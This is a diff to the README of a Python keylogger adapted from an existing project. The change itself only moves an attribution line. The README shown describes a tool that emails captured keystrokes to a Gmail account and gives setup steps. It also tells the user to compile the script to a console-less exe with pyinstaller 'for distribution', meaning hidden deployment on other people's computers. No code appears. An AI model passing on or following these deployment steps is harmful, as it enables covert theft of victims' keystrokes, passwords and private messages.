@@ -3,8 +3,6 @@ A python keylogger that sends its logs to gmail. You'll need to allow less secur
 
 You'll need the pyHook and pythoncom modules for this to work.
 
-Adaptation of https://github.com/ajinabraham/Xenotix-Python-Keylogger
-
 To use it simply change the following variables:
 
 ```
@@ -14,3 +12,5 @@ TO
 ```
 
 To your specifications and compile the script to exe with pyinstaller for distribution, use the --noconsole flag when compiling.
+
+This is an adaptation of the original authored by ajinabraham https://github.com/ajinabraham
